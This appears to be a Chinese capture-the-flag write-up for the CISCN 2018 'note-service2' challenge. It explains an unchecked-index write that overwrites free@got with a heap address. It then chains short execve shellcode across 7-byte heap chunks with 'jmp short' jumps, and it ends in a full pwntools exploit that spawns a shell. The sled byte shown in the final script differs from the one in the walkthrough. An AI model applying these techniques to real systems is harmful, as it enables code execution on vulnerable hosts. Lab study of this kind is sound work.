## CISCN-2018-Quals-note-service2

### 总结

做完这道题，收获如下：

- 1）汇编语句`jmp short s`，最后编译出来的机器码为`\xEB\x??`，问号代表`pc`寄存器会往前或往后跳转`x`个字节，`x`的范围为`-128~127`。要从`??`结束后算起。正数往前跳，负数往回跳。
- 2）修改某个函数的`got`表地址后，可以将目标地址填充为一段`shellcode`，如果是在堆上，那么需要借助`jmp short`指令。算好偏移。
- 3）`mov rsi, 0`比`xor rsi, rsi`要长，尽量用后面的。
- 4）`mov rax, 0x3b`比`mov eax, 0x3b`要长，如果长度有限制就用后面的。



### Checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221181537.png)

发现关闭了NX，可能要利用shellcode。

### 题目分析

首先把附件放在IDA中打开，发现是个菜单题：

**main**：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221182640.png)

**sub_E30**:

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221182801.png)

**menu**:

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221182827.png)

**add_note**:

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221183021.png)

可以看到，没有检查idx是否合法，可以在任意地址写一个对地址。

注意：如果申请的大小为8，最多只能写7个字节。

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221183452.png)



**delete_note**:

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221183248.png)

选项2和选项3并没有什么用。

由于程序关闭了堆栈不可执行，因此可以考虑修改某一个函数got表的内容为堆地址，在堆上写shellcode。

### 解题思路

#### 尝试的解题思路

- 发现有`UAF`漏洞，看能不能从`UAF`入手，泄露出`libc`的基地址或程序的基地址。然后，一顿思考后，发现程序没有`edit`，没有`show`，还只让输入`8`个字节，这就有点难搞。所以这个思路不太行。

- 由于在`add_note`中，没有校验输入的`idx`，所以是可以修改`func@got`的内容的，填充为一个堆地址。但是只让写`7`个字节，啥`shellcode`会这么短啊······谷歌后，发现一个`gadget`叫`jmp short`，可以拼接跳转执行，再加上一些滑板指令，就能拼凑出完整的`shellcode`。

  这里需要注意，只让写`7`个字节，所以指令的机器码不能太长，用`xor`代替`mov`，用`mov eax, 0x3b`代替`mov rax , 0x3b`。还有`jmp short`的机器码是`\xEB`，后面直接接一个偏移。偏移要算上后面的`8`个字节，加上下一个`chunk`的`pre_size`和`size`，所以一共是`1+8+8+8=0x19` 。也就是说前面填满`5`个字节，接一个`\xEB\x19`即可。



#### 最终解题思路

- 1）申请一块内存大小为8，内容`/bin/sh`
- 2）修改`free@got`的内容为堆地址
- 3）利用`jmp short s`往连续的几块`chunk`写入`shellcode`，`shellcode`为执行`execve`的系统调用。除去`pop rdi; ret`。因为`free(ptr)`，会自动`mov rdi, ptr`。
- 4）调用`delete_note`，释放前面的`/bin/sh`的内存块

### 编写EXP

首先把函数写好：

```python
def add_note(idx:int, size:int, content:bytes=b'\x00'):
    global io
    io.sendlineafter("your choice>> ", '1')
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("size:", str(size))
    io.sendlineafter("content:", content)

def delete_note(idx:int):
    global io
    io.sendlineafter("your choice>> ", '4')
    io.sendlineafter("index:", str(idx))
```

首先分配一块带有`/bin/sh`的，预备调用。然后，往索引为`-17`处分配，修改`free@got`的内容为堆地址，顺便写上一条`shellcode`，`xor rsi, rsi`。这里选用`\xc0`作为滑板指令。

```python
add_note(0, 8, b'/bin/sh')
add_note(-17 , 8, asm('xor rsi, rsi') + b'\xC0\xC0\xEB\x19')
```

`-17`的计算是这样的：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194202.png)

可以看到，`free@got`的偏移为`0x202018`，题目中存储堆地址起始位置为`0x2020a0`，所以索引就是`(0x202018 - 0x2020a0) // 8 = -17`。

这里给出申请前后`free@got`的内容变化：

申请前：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194715.png)

申请后：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194817.png)

可以看到，`free@got`已修改成功，同时写上了`xor rsi,rsi; \xc0\xc0\xeb\x19`。

然后继续写：

```python
add_note(1, 8, asm('xor rdx, rdx') + b'\xC0\xC0\xEB\x19')
add_note(2, 8, asm('mov eax, 59') + b'\xEB\x19')
add_note(4, 8, asm('syscall'))
```

之后就会：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210451.png)

最后：

```python
delete_note(0) # get shell
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210711.png)

#### 完整exp

```python
from pwn import *

io = process('./note')

context.update(arch='amd64', os='linux', endian='little')

def add_note(idx:int, size:int, content:bytes=b'\x00'):
    global io
    io.sendlineafter("your choice>> ", '1')
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("size:", str(size))
    io.sendlineafter("content:", content)

def delete_note(idx:int):
    global io
    io.sendlineafter("your choice>> ", '4')
    io.sendlineafter("index:", str(idx))

# 利用 jmp short s指令写shellcode
# 修改free@got处地址为堆地址
add_note(0, 8, b'/bin/sh')
add_note(-17 , 8, asm('xor rsi, rsi') + b'\x0C\x0C\xEB\x19')
add_note(1, 8, asm('xor rdx, rdx') + b'\x0C\x0C\xEB\x19')
add_note(2, 8, asm('mov eax, 59') + b'\xEB\x19')
add_note(4, 8, asm('syscall'))

delete_note(0)

io.interactive()
```

